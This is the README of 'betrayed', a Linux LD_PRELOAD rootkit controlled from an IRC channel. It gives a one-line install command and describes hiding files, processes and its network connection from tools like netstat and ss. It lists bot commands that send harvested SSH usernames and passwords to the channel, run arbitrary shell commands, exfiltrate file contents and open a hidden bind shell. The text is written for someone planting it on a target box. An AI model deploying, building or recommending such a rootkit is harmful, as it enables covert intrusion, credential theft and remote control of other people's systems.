# betrayed
### Basic info
betrayed is an LD_PRELOAD Linux rootkit which is controlled mainly from a IRC channel.</br>
It is free of any dependencies, and installs near enough instantly.</br>
Files and processes are hidden with a magic GID, and the connection to the IRC server is hidden from plain sight. Tools like `netstat` and `ss` will not show betrayed's socket connection.</br>
Upon setup, betrayed will begin to fork from newly spawned processes, of course only if there is no other instance of the main process.</br>
betrayed's code is a very heavily modified and (de)restructured version of bedevil.
#### Usage
`./install.sh irc.host "#channel"` will install betrayed.</br>
Upon completing installation, install.sh will `cat /dev/null`, which will cause betrayed to execute its initial fork process. Even without doing `cat /dev/null` at the end of the installation, any newly spawned process will initiate the connection to the IRC server.</br>
<b>Compile only:</b> `COMPILE_ONLY=1 ./install.sh ...` will compile betrayed.so in your cwd.</br>
</br>
Once installed, and assuming you are in your target channel, you will see a new user with a random nick join your channel. That is essentially the box that you installed betrayed on.
#### Available commands
 * !ssh_logs [nick] (reads outgoing SSH logs, sends usernames and passwords to your desired IRC channel)
 * !sh [nick] [command] (executes commands on chosen server, and sends command output to the channel)
 * !read_file [nick] [path] (sends contents of path to IRC channel)
 * !bind [nick] [port] (creates a hidden /bin/sh bind shell on given port which you can connect to)
 * !kill [nick]/all (kills chosen iteration of betrayed. removes all respective rootkit files and disconnects)